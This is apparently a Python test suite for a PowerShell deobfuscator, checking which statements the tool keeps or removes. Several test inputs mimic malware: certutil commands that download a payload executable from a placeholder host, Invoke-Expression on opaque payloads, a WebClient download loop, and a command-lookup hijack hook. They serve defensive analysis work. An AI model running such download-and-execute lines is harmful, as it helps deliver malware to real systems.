from __future__ import annotations

from inspect import cleandoc

from test import backlog, opportunity, todo, wontfix
from test.lib.scripts.ps1.deobfuscation import TestPs1

from refinery.lib.scripts.ps1.ast import get_command_name
from refinery.lib.scripts.ps1.model import Ps1CommandInvocation
from refinery.lib.scripts.ps1.parser import Ps1Parser

_ANCHOR = "Write-Host 'ANCHOR_SURVIVES'"


class TestPs1TheSuccessVariableObservesACallThatRan(TestPs1):

    def test_the_success_variable_after_a_call_reports_the_call_and_not_the_failure_before_it(self):
        self._assertDeobfuscatesToOneOf("""
            function K { }
            Write-Error 'e'
            K
            Write-Host $?
        """, """
            function K { }
            Write-Error 'e'
            K
            Write-Host $?
        """, """
            Write-Error 'e'
            Write-Host $True
        """)

    def test_the_same_call_is_removed_where_nothing_reads_the_success_variable(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            Write-Error 'e'
            K
            {_ANCHOR}
        """, F"""
            Write-Error 'e'
            {_ANCHOR}
        """)


class TestPs1TheFunctionDriveObservesADefinition(TestPs1):

    def test_a_definition_a_function_drive_read_reports_on_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            Write-Host $function:K
        """)

    def test_a_definition_an_item_cmdlet_reports_on_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            Write-Host (Get-Item function:K)
        """)

    def test_a_function_drive_read_keeps_only_the_name_it_reports_on(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            K
            function Z {{ }}
            Z
            Write-Host $function:K
        """, F"""
            function K {{ }}
            K
            Write-Host $function:K
        """)


class TestPs1ACommandTableReaderObservesADefinitionItNames(TestPs1):

    @todo
    def test_a_definition_a_literal_read_names_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            $Null = (Get-Command K).Name
            {_ANCHOR}
        """)

    def test_a_definition_written_below_the_read_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            $Null = (Get-Command K).Name
            function K {{ }}
            K
            {_ANCHOR}
        """, F"""
            $Null = (Get-Command K).Name
            {_ANCHOR}
        """)

    def test_a_definition_only_a_pattern_could_match_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function vnMTH {{ }}
            vnMTH
            $Null = (Get-Command *vnMT*).Name
            {_ANCHOR}
        """, F"""
            $Null = (Get-Command *vnMT*).Name
            {_ANCHOR}
        """)


class TestPs1ACallAboveItsDefinitionNamesNoCommand(TestPs1):

    def test_a_call_written_above_the_only_definition_of_its_name_is_kept(self):
        self._assertKept(F"""
            K
            function K {{ }}
            Write-Host $?
        """)

    def test_a_call_written_below_the_definition_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ }}
            K
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1AStoredBlockRendersTheStatementsInIt(TestPs1):

    def test_a_call_inside_a_block_the_script_writes_out_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            K
            $b = {{ K }}
            Write-Host $b
        """)

    def test_a_block_the_script_writes_out_keeps_a_statement_that_acts(self):
        self._assertKept(F"""
            $b = {{ {_ANCHOR} }}
            Write-Host $b
        """)


class TestPs1AWorkflowBindsTheNameAFunctionBinds(TestPs1):

    def test_a_call_a_workflow_of_the_same_name_claims_is_kept(self):
        self._assertKept(F"""
            function K {{ }}
            workflow K {{ Write-Host 'P' }}
            K
        """)


class TestPs1AnAliasAttributeBindsASecondNameForTheFunction(TestPs1):

    def test_a_definition_called_under_its_attribute_alias_is_kept(self):
        self._assertKept(F"""
            function K {{ [Alias('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_the_attribute_suffixed_spelling_binds_the_name_too(self):
        self._assertKept(F"""
            function K {{ [AliasAttribute('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_the_namespace_qualified_spelling_binds_the_name_too(self):
        self._assertKept(F"""
            function K {{ [System.Management.Automation.AliasAttribute('q')] param() }}
            q
            {_ANCHOR}
        """)

    def test_a_definition_with_no_attribute_alias_is_removed_with_its_call(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param() }}
            K
            {_ANCHOR}
        """, _ANCHOR)

    def test_an_alias_on_a_parameter_names_the_parameter_not_the_command(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param([Alias('q')]$x) }}
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1AParameterDefaultIsConvertedUnderItsTypeConstraint(TestPs1):

    def test_a_call_whose_parameter_default_does_not_convert_is_kept(self):
        self._assertKept(F"""
            function K {{ param([int] $x = 'abc') }}
            K
            {_ANCHOR}
        """)

    def test_a_call_whose_parameter_default_converts_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param([int] $x = '42') }}
            K
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_call_whose_parameter_carries_no_type_constraint_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            function K {{ param($x = 'abc') }}
            K
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1ADefinitionReachedUnderASpellingTheWalkDoesNotFileUnderIt(TestPs1):

    def test_a_definition_the_implicit_get_retry_reaches_is_kept(self):
        self._assertKept(F"""
            function Get-Language {{ }}
            language
            {_ANCHOR}
        """)

    def test_a_definition_a_builtin_alias_reaches_is_kept(self):
        self._assertDeobfuscatesTo("""
            function Measure-Object { }
            Measure-Object
            1, 2, 3 | measure
        """, """
            function Measure-Object { }
            Measure-Object
            1, 2, 3 | Measure-Object
        """)


class TestPs1AnIdentityNamespaceAssignmentRebindsTheNameItSpells(TestPs1):

    def test_a_call_an_identity_assignment_rebinds_runs_the_body_it_binds(self):
        self._assertDeobfuscatesToOneOf("""
            function q { }
            ${function:q} = { Write-Host 'P' }
            q
        """, """
            function q { }
            $function:q = { Write-Host 'P' }
            q
        """, """
            $function:q = { Write-Host 'P' }
            q
        """, """
            Write-Host 'P'
        """)

class TestPs1ADefinitionCodeTheWalkCannotReadMayReachIsKept(TestPs1):

    def test_a_definition_no_visible_call_site_reaches_is_kept_beside_a_leak(self):
        self._assertKept("""
            function K { }
            Invoke-Expression $q
        """)

    def test_a_definition_shadowing_a_cmdlet_is_kept_beside_a_leak(self):
        self._assertDeobfuscatesToOneOf("""
            function Get-Date { }
            Get-Date
            Invoke-Expression $q
        """, """
            function Get-Date { }
            Get-Date
            Invoke-Expression $q
        """, """
            function Get-Date { }
            Invoke-Expression $q
        """)

    def test_a_definition_is_kept_beside_an_opaque_dispatch(self):
        self._assertDeobfuscatesToOneOf("""
            function K { }
            K
            & $f
        """, """
            function K { }
            K
            & $f
        """, """
            function K { }
            & $f
        """)

    def test_a_definition_is_kept_beside_an_export(self):
        self._assertDeobfuscatesToOneOf("""
            function K { }
            K
            Export-ModuleMember -Function K
        """, """
            function K { }
            K
            Export-ModuleMember -Function K
        """, """
            function K { }
            Export-ModuleMember -Function K
        """)

class TestPs1ALeakAboveADefinitionCanRebindTheNameItBinds(TestPs1):

    def test_a_definition_and_its_call_below_a_leak_are_kept(self):
        self._assertKept("""
            Invoke-Expression $q
            function K { }
            K
        """)

    def test_a_definition_and_its_call_around_a_leak_are_kept(self):
        self._assertKept("""
            function K { }
            Invoke-Expression $q
            K
        """)

    def test_a_definition_called_above_a_leak_is_kept(self):
        self._assertDeobfuscatesToOneOf("""
            function K { }
            K
            Invoke-Expression $q
        """, """
            function K { }
            K
            Invoke-Expression $q
        """, """
            function K { }
            Invoke-Expression $q
        """)

class TestPs1ADefinitionMayShadowOneBoundWhereTheWalkCannotSee(TestPs1):

    @todo
    def test_a_definition_shadowing_one_an_inlined_string_bound_is_kept(self):
        self._assertKept("""
            $env:B = 'function K { Write-Host P }'
            Invoke-Expression $env:B
            function K { 42 }
            $x = K
            Write-Output $x
            $env:C = 'K'
            Invoke-Expression $env:C
        """)

class TestPs1ARaiseAbandonsTheStatementsBelowItInTheSameBlock(TestPs1):

    def test_a_value_below_a_dropped_noise_bareword_is_not_carried_out_of_the_try(self):
        self._assertKept("""
            function f { try { zzq0000=5; 'tail' } catch {} }
            Write-Host (f)
        """)

    def test_the_same_value_with_no_raise_above_it_is_carried(self):
        self._assertDeobfuscatesTo("""
            function f { try { 'tail' } catch {} }
            Write-Host (f)
        """, "Write-Host 'tail'")

    def test_a_noise_bareword_alone_in_the_try_dissolves_the_construct(self):
        self._assertDeobfuscatesTo("""
            try {
              zzq0000=5
            } catch {}
            'next'
        """, "'next'")

    def test_a_call_above_the_definition_of_its_name_is_not_folded_to_the_body(self):
        source = """
            zzqfoo1
            function zzqfoo1 { 'boom' }
            zzqfoo1
        """
        folded = """
            zzqfoo1
            'boom'
        """
        self._assertDeobfuscatesToOneOf(source, source, folded)

    def test_a_call_below_the_definition_is_folded_to_the_body(self):
        self._assertDeobfuscatesTo("""
            function zzqfoo1 { 'boom' }
            zzqfoo1
        """, "'boom'")

    def test_a_call_reached_only_through_a_later_invocation_is_folded(self):
        self._assertDeobfuscatesTo("""
            function A { zzqfoo1 }
            function zzqfoo1 { 'boom' }
            A
        """, "'boom'")

class TestPs1TheHandlerAroundANoiseBarewordHasToMatchIt(TestPs1):

    @opportunity
    def test_a_noise_bareword_under_a_catch_that_cannot_match_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch [System.IO.IOException] {{}}
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_noise_bareword_under_a_non_matching_catch_is_kept_where_an_outer_catch_acts(self):
        output = self._deobfuscate(cleandoc(F"""
            try {{
              try {{
                zzqq0 =5
              }} catch [System.IO.IOException] {{}}
            }} catch {{
              Write-Host 'OUTER'
            }}
            {_ANCHOR}
        """))
        self.assertIn('zzqq0', output)
        self.assertIn("Write-Host 'OUTER'", output)

    @opportunity
    def test_a_noise_bareword_under_a_try_with_no_catch_at_all_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} finally {{
              Write-Host 'FIN'
            }}
            {_ANCHOR}
        """, F"""
            Write-Host 'FIN'
            {_ANCHOR}
        """)

    @opportunity
    def test_a_trap_that_resumes_past_a_noise_bareword_goes_with_it(self):
        self._assertDeobfuscatesTo(F"""
            trap {{ continue }}
            zzqq0 =5
            {_ANCHOR}
        """, _ANCHOR)

    def test_a_trap_whose_body_acts_is_kept(self):
        self._assertKept(F"""
            trap {{
              Write-Host 'TRAPPED'
              continue
            }}
            zzqq0 =5
            {_ANCHOR}
        """)

    def test_a_noise_bareword_under_a_catch_that_matches_everything_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            {_ANCHOR}
        """, _ANCHOR)


class TestPs1ANoiseBarewordIsKeptWhereTheRecordItLeavesIsRead(TestPs1):

    def test_a_noise_bareword_is_kept_where_the_script_reads_the_error_list(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_script_reads_the_success_variable(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $?
        """)

    def test_a_noise_bareword_is_kept_where_the_stack_trace_is_read(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host $StackTrace
        """)

    def test_a_noise_bareword_is_kept_where_the_read_arrives_through_a_resolved_payload(self):
        self._assertDeobfuscatesTo("""
            $zzqc = '$Error.Count'
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $zzqc
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_read_is_spelled_in_a_payload_nothing_resolves(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            & $env:ZZQCOMMAND '$Error.Count'
        """)

    @backlog
    def test_a_noise_bareword_is_kept_where_the_read_is_spelled_across_two_strings(self):
        self._assertDeobfuscatesTo("""
            $zzqa = '$Err'
            $zzqb = 'or.Count'
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression ($zzqa + $zzqb)
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_read_is_built_out_of_characters(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            $zzqc = -join [char[]](36, 69, 114, 114, 111, 114, 46, 67, 111, 117, 110, 116)
            Invoke-Expression $zzqc
        """, """
            try {
              zzqq0 =5
            } catch {}
            $Error.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_record_is_read_through_get_variable(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            $v = Get-Variable Error
            Write-Host $v.Value.Count
        """)

    def test_a_noise_bareword_is_kept_where_the_record_is_read_through_the_variable_drive(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            $v = Get-Item Variable:Error
            Write-Host $v.Value.Count
        """)

    def test_a_noise_bareword_is_kept_where_that_same_read_is_resolved_to_the_variable(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            Write-Host (Get-Variable Error).Value.Count
        """, """
            try {
              zzqq0 =5
            } catch {}
            Write-Host $Error.Count
        """)

    @opportunity
    def test_a_noise_bareword_beside_a_message_that_only_prints_the_name_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host '$Error.Count'
            {_ANCHOR}
        """, F"""
            Write-Host '$Error.Count'
            {_ANCHOR}
        """)

    def test_a_noise_bareword_beside_a_message_that_says_the_word_without_the_sigil_is_removed(
        self
    ):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host 'an error occurred'
            {_ANCHOR}
        """, F"""
            Write-Host 'an error occurred'
            {_ANCHOR}
        """)

    def test_a_noise_bareword_beside_a_longer_name_sharing_the_prefix_is_removed(self):
        self._assertDeobfuscatesTo(F"""
            try {{
              zzqq0 =5
            }} catch {{}}
            Write-Host '$ErrorActionPreference = Stop'
            {_ANCHOR}
        """, F"""
            Write-Host '$ErrorActionPreference = Stop'
            {_ANCHOR}
        """)


class TestPs1ANoiseBarewordIsAnsweredWhereItStands(TestPs1):

    def test_a_noise_bareword_above_a_definition_of_its_own_name_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzq0000 =5
            } catch {}
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
        """, """
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
        """)

    def test_a_noise_bareword_below_the_definition_is_kept(self):
        self._assertKept("""
            function zzq0000 {
              Write-Host 'DEFINED'
            }
            zzq0000 'used'
            try {
              zzq0000 =5
            } catch {}
        """)


class TestPs1ANoiseBarewordIsDroppedAboveAPayloadTheWalkCannotRead(TestPs1):

    def test_a_noise_bareword_above_an_environment_payload_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """, 'Invoke-Expression $env:ZZQPAYLOAD')

    def test_a_noise_bareword_above_a_dispatch_through_a_name_it_cannot_read_is_removed(self):
        self._assertDeobfuscatesTo("""
            try {
              zzqq0 =5
            } catch {}
            & $env:ZZQCOMMAND 'arg'
        """, "& $env:ZZQCOMMAND 'arg'")

    def test_a_noise_bareword_above_a_visible_read_of_the_error_list_is_kept(self):
        self._assertKept("""
            try {
              zzqq0 =5
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
            Write-Host $Error.Count
        """)


class TestPs1AProgramOnThePathIsSpelledLikeANoiseBareword(TestPs1):

    def test_a_downloader_whose_arguments_carry_no_marker_is_kept_beside_a_leak(self):
        self._assertKept("""
            try {
              certutil -urlcache -f http://host/payload.exe out.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """)

    def test_a_downloader_whose_marker_sits_in_a_real_argument_is_kept_beside_a_leak(self):
        self._assertKept("""
            try {
              certutil -urlcache -f =http://host/payload.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """)

    def test_a_program_whose_whole_argument_list_is_the_marker_is_dropped_beside_a_leak(self):
        self._assertDeobfuscatesTo("""
            try {
              certutil =http://host/payload.exe
            } catch {}
            Invoke-Expression $env:ZZQPAYLOAD
        """, 'Invoke-Expression $env:ZZQPAYLOAD')


class TestPs1AnErrorNothingTakesInsideATryOrCatchBodySkipsTheRestOfTheTry(TestPs1):

    def test_a_cast_that_fails_in_a_try_body_without_a_catch_is_kept(self):
        self._assertKept("""
            try {
              $Null = [int]'a'
              Write-Host 'rest'
            } finally {}
            Write-Host 'after'
        """)

    def test_a_cast_that_fails_in_a_catch_body_is_kept(self):
        self._assertKept("""
            try {
              throw 'x'
            } catch {
              $Null = [int]'a'
              Write-Host 'c-rest'
            }
            Write-Host 'after'
        """)

    def test_a_trap_that_resumes_inside_a_try_body_without_a_catch_is_kept(self):
        self._assertKept("""
            try {
              trap {
                continue
              }
              $v = [int]'a'
              Write-Host "rest ${v}"
            } finally {}
            Write-Host 'after'
        """)


class TestPs1ARaiseAResumingTrapSkipsPastIsKept(TestPs1):

    def test_a_cast_whose_trap_resumes_past_the_rest_of_its_block_is_kept(self):
        output = self._deobfuscate(cleandoc("""
            trap {
              continue
            }
            if ((Get-Date).Year -gt 2000) {
              $v = [int]'a'
              Write-Host 't'
            }
            Write-Host 'after'
        """))
        self.assertIn("[int]'a'", output)


class TestPs1ACallMeasuredNeverToFailSkipsNothing(TestPs1):

    def test_calls_that_cannot_fail_go_from_a_catch_body(self):
        self._assertDeobfuscatesTo("""
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                $k = [Math]::Sqrt(36)
                (Get-Random).GetHashCode() | Out-Null
                $r = [array]::Reverse((1, 2, 3, 4))
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """, """
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """)

    def test_a_call_handed_a_value_no_fact_covers_stays_in_a_catch_body(self):
        self._assertKept("""
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                $Null = [Math]::Sqrt($s)
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """)

    def test_a_random_number_stays_where_the_script_binds_default_parameter_values(self):
        self._assertKept("""
            $PSDefaultParameterValues['Get-Random:Maximum'] = 0
            $w = New-Object Net.WebClient
            while ($True) {
              try {
                $d = $w.DownloadString($u)
              } catch {
                (Get-Random).GetHashCode() | Out-Null
                Start-Sleep -Seconds 5
                continue
              }
              Write-Host $d
            }
        """)

    def test_a_store_above_a_call_that_cannot_fail_is_overwritten_below_it(self):
        self._assertDeobfuscatesTo("""
            try {
              throw 'x'
            } catch {
              $x = 'two'
              $k = [Math]::Sqrt(36)
              $x = 'three'
            }
            Write-Host $x
        """, """
            Write-Host 'three'
        """)

    def test_a_trap_over_a_catch_body_that_cannot_fail_goes(self):
        self._assertDeobfuscatesTo("""
            try {
              throw 'x'
            } catch {
              trap { continue }
              $b = Get-Random
              Write-Host 'a'
            }
            Write-Host 'end'
        """, """
            Write-Host 'a'
            Write-Host 'end'
        """)


class TestPs1AFailingTestOrCollectionSkipsTheRestOfTheBody(TestPs1):

    def test_a_failing_test_keeps_a_catch_body_from_being_run_in_place_of_its_try(self):
        self._assertKept("""
            $x = 'one'
            try {
              throw 'q'
            } catch {
              $x = 'two'
              if ([int]'a') {}
              $x = 'three'
            }
            Write-Host $x
        """)

    def test_a_failing_test_collection_or_subject_skips_the_rest_of_the_catch_body(self):
        for construct in (
            "foreach ($i in [int]'a') {}",
            "switch ([int]'a') {\n    1 {}\n  }",
            "while ([int]'a') {}",
            "for (; [int]'a'; ) {}",
            "do {} while ([int]'a')",
        ):
            with self.subTest(construct):
                self._assertKept(F"""
                    try {{
                      throw 'x'
                    }} catch {{
                      {construct}
                      Write-Host 'rest'
                    }}
                    Write-Host 'after'
                """)

    def test_a_failing_clause_condition_or_pattern_skips_the_rest_of_the_catch_body(self):
        for construct in (
            "switch (1) {\n    ([int]'a') {}\n  }",
            "switch -Regex ('a') {\n    '[' {}\n  }",
            "switch -Wildcard ('a') {\n    '[' {}\n  }",
        ):
            with self.subTest(construct):
                self._assertKept(F"""
                    try {{
                      throw 'x'
                    }} catch {{
                      {construct}
                      Write-Host 'rest'
                    }}
                    Write-Host 'after'
                """)

    @wontfix('no obfuscator enumerates into a variable whose type it constrained before')
    def test_a_loop_variable_whose_type_is_constrained_skips_the_rest_of_the_catch_body(self):
        self._assertKept("""
            [int]$i = 0
            try {
              throw 'x'
            } catch {
              foreach ($i in 'a') {}
              Write-Host 'rest'
            }
            Write-Host 'after'
        """)

    def test_a_store_above_a_failing_test_is_the_one_read_after_the_try(self):
        self._assertKept("""
            try {
              $x = 'one'
              if ([int]'a') {}
              $x = 'two'
            } finally {}
            Write-Host $x
        """)


class TestPs1AFailingLineInAnArrayExpressionSkipsTheRestOfTheBody(TestPs1):

    def test_the_statement_and_the_store_above_it_are_kept(self):
        self._assertKept("""
            $x = 'one'
            try {
              $x = 'two'
              $y = @([int]'a')
              $x = 'three'
            } catch [System.IO.IOException] {}
            Write-Host $x
        """)

    def test_the_rest_of_the_catch_body_is_kept_from_running(self):
        self._assertKept("""
            try {
              throw 'x'
            } catch {
              $y = @([int]'a')
              Write-Host 'rest'
            }
            Write-Host 'after'
        """)


class TestPs1AThrowCarriesOnWhereTheScriptMaySilenceErrors(TestPs1):

    def test_the_line_after_the_throw_stays_however_the_preference_was_set(self):
        for setting in (
            "Invoke-Expression '$ErrorActionPreference = 0'",
            "Set-Variable -Name ('Error' + 'ActionPreference') -Value 0",
            "$ExecutionContext.SessionState.PSVariable.Set('ErrorActionPreference', 'SilentlyContinue')",
            "$t = @{ Name = 'ErrorActionPreference'; Value = 0 }; Set-Variable @t",
            'Set-Item -LiteralPath Variable:ErrorActionPreference 0',
        ):
            with self.subTest(setting):
                self.assertIn('after', self._deobfuscate(F"{setting}; throw 'boom'; Write-Host 'after'"))

    def test_the_line_after_the_throw_stays_where_the_preference_is_bound_as_a_variable(self):
        for source in (
            "foreach ($ErrorActionPreference in 'SilentlyContinue') { throw 'boom'; Write-Host 'in' }",
            "& { param($ErrorActionPreference) throw 'boom'; Write-Host 'in' } SilentlyContinue",
        ):
            with self.subTest(source):
                self.assertIn("Write-Host 'in'", self._deobfuscate(source))

    def test_the_line_after_the_throw_stays_in_every_body_an_advanced_function_runs(self):
        for source in (
            "function g { throw 'x'; Write-Host 'g-after' }; "
            "function f { [CmdletBinding()] param() g }; f -ErrorAction SilentlyContinue",
            "function f { [CmdletBinding()] param() & { throw 'x'; Write-Host 'g-after' } }; "
            "f -ErrorAction SilentlyContinue",
        ):
            with self.subTest(source):
                self.assertIn('g-after', self._deobfuscate(source))


class TestPs1ACallOfASeededGeneratorIsKept(TestPs1):

    def test_a_discarded_call_stays(self):
        result = self._deobfuscate(
            '$null = Get-Random -SetSeed 7; Get-Random | Out-Null; Write-Host (Get-Random -Maximum 1000)')
        self.assertIn('Get-Random | Out-Null', result)

    def test_a_call_that_cannot_fail_stays_in_a_catch_body(self):
        result = self._deobfuscate(
            "$null = Get-Random -SetSeed 7; try { throw 'x' } catch { (Get-Random).GetHashCode() | Out-Null }; "
            "Write-Host (Get-Random -Maximum 1000)")
        self.assertIn('GetHashCode', result)


class TestPs1AnErrorInAScriptBlockIsRaisedWhereTheBlockRuns(TestPs1):

    def test_a_function_nothing_calls_goes_though_an_error_in_it_skips_a_line(self):
        self._assertDeobfuscatesTo("""
            function f {
              try {
                $r = [int]'x'
                Write-Host 'a'
              } catch {}
            }
            Write-Host 'end'
        """, """
            Write-Host 'end'
        """)

    def test_a_block_run_in_place_keeps_the_error_that_skips_the_line_after_it(self):
        self._assertKept("""
            try {
              $Null = & {
                [int]'x'
              }
              Write-Host 'b'
            } catch {}
            Write-Host 'end'
        """)


class TestPs1ACommandLookupHookTakesEveryCommandOver(TestPs1):

    def test_a_call_a_fact_covers_stays_after_the_hook(self):
        result = self._deobfuscate(
            "$ExecutionContext.InvokeCommand.PreCommandLookupAction = { param($n, $e) "
            "if ($n -eq 'Get-Random') { $e.CommandScriptBlock = { throw 'hijack' } } }; "
            "try { throw 'x' } catch { Get-Random; Write-Host 'rest' }; Write-Host 'after'")
        self.assertTrue(any(
            isinstance(node, Ps1CommandInvocation) and get_command_name(node) == 'Get-Random'
            for node in Ps1Parser(result).parse().walk()
        ))

    def test_a_call_a_fact_covers_stays_after_a_member_named_by_a_value_is_set(self):
        hook = "{ param($n, $e) if ($n -eq 'Get-Random') { $e.CommandScriptBlock = { throw 'hijack' } } }"
        for install in (
            F'$ExecutionContext.InvokeCommand.($args[0]) = {hook}',
            F'$ExecutionContext.InvokeCommand.($args[0])({hook})',
        ):
            with self.subTest(install):
                result = self._deobfuscate(F"{install}; try {{ $null = Get-Random; Write-Host 'a' }} catch {{ Write-Host 'caught' }}")
                self.assertTrue(any(
                    isinstance(node, Ps1CommandInvocation) and get_command_name(node) == 'Get-Random'
                    for node in Ps1Parser(result).parse().walk()
                ))


class TestPs1ACommandThatFailsInACatchBodyLeavesIt(TestPs1):

    def test_a_command_naming_a_type_that_does_not_exist_keeps_its_catch_body_in_place(self):
        self.assertIn('catch {', self._deobfuscate(
            "try { throw 'x' } catch { New-Object Foo.Bar; Write-Host 'rest' }; Write-Host 'after'"))

    def test_a_command_handed_a_parameter_it_does_not_have_keeps_its_catch_body_in_place(self):
        self.assertIn('catch {', self._deobfuscate(
            "try { throw 'x' } catch { Get-Random -Bogus 1; Write-Host 'rest' }; Write-Host 'after'"))


class TestPs1AnErrorInABodyACatchOrTryBodyRunsLeavesThatBody(TestPs1):

    def test_a_failing_line_in_a_block_a_catch_body_runs_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "$x = 'one'; try { throw 'q' } catch { $x = 'two'; & { $null = [int]'a' }; $x = 'three' }; Write-Host $x"))

    def test_a_failing_line_in_a_function_a_try_body_calls_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { $script:x = 'one'; $null = [int]'a'; $script:x = 'two' }; "
            "try { f } catch { }; Write-Host $script:x"))


class TestPs1TheLineAfterARethrowNothingTakesIsDead(TestPs1):

    @opportunity
    def test_the_line_after_the_try_goes(self):
        self.assertNotIn('after', self._deobfuscate("try { throw 'x' } catch { throw $_ }; Write-Host 'after'"))


class TestPs1WhereAnErrorLandsIsAskedOfEveryWayIntoIt(TestPs1):

    def test_a_failing_line_before_a_finally_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { $null = [int]'a' } finally { }; Write-Host 'rest' } finally { }; Write-Host 'after'"))

    def test_a_failing_line_a_typed_trap_declines_to_an_outer_trap_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "trap { continue }; if ($Host) { trap [System.IO.IOException] { continue }; $null = [int]'a'; "
            "Write-Host 'rest' }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_an_error_runs_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { throw 'x' } finally { $null = [int]'a' } } finally { }; Write-Host 'after'"))

    def test_a_failing_line_nested_in_a_catch_body_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { throw 'x' } catch { if ($Host) { $null = [int]'a'; Write-Host 'rest' } }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_an_error_runs_inside_a_catch_body_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { throw 'y' } catch { try { throw 'x' } finally { $null = [int]'a' } }; Write-Host 'after'"))

    def test_a_failing_line_whose_failure_a_finally_reads_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate("try { $null = [int]'a' } finally { Write-Host $? }"))

    def test_a_failed_cast_goes_to_a_later_clause_naming_a_type_it_derives_from(self):
        # 5.1 matches the cast's own exception before the error that wraps it, so the second clause
        # takes it and not the first.
        for clause, mark in (('System.InvalidCastException', 'I'), ('System.Exception', 'E')):
            with self.subTest(clause):
                self.assertIn(F"'{mark}'", self._deobfuscate(
                    F"try {{ $null = [int]'a' }} catch [System.Management.Automation.RuntimeException] "
                    F"{{ Write-Host 'R' }} catch [{clause}] {{ Write-Host '{mark}' }}; Write-Host 'after'"))

    def test_a_failing_line_at_the_end_of_a_loop_body_is_kept_where_its_error_leaves_the_loop(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { foreach ($i in 1, 2) { Write-Host 'm'; $null = [int]'a' } } catch { }; Write-Host 'after'"))

    def test_a_trap_in_a_try_body_that_always_throws_is_kept(self):
        self.assertIn("'T'", self._deobfuscate(
            "try { throw 'x'; trap { Write-Host 'T'; break } } catch { }; Write-Host 'after'"))


class TestPs1AnErrorThatLeavesAFunctionCalledUnderAHandlerEndsTheFunction(TestPs1):

    def test_a_trap_in_a_function_called_in_a_try_with_an_empty_catch_is_kept(self):
        self._assertKept("""
            function f {
              trap {
                continue
              }
              $v = [int]'a'
              Write-Host "rest $v"
            }
            try {
              f
            } catch {
            }
            Write-Host 'after'
        """)


class TestPs1AReadStrictModeFailsIsSkippedPastByTheTrapAroundIt(TestPs1):

    def test_a_trap_that_resumes_past_a_read_strict_mode_fails_is_kept(self):
        self._assertKept("""
            Set-StrictMode -Version 1
            $w = 'a'
            $m = 'out'
            trap {
              continue
            }
            if ($Host) {
              $w = $undefined
              $m = 'in'
            }
            Write-Host "$m $w"
        """)


class TestPs1AStoreAFailingOverwriteLeavesInPlaceIsKept(TestPs1):

    def test_a_store_a_failing_cast_overwrites_is_kept(self):
        self.assertIn('$port = 80', self._deobfuscate("$port = 80; $port = [int]'x'; Write-Host \"port $port\""))

